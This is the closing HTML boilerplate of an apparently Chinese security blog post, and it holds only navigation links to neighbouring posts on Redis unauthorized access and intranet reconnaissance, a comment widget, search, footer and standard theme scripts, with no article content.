                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/03/24/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Redis未授权访问</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/03/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
                        <span class="hidden-mobile">内网信息收集</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
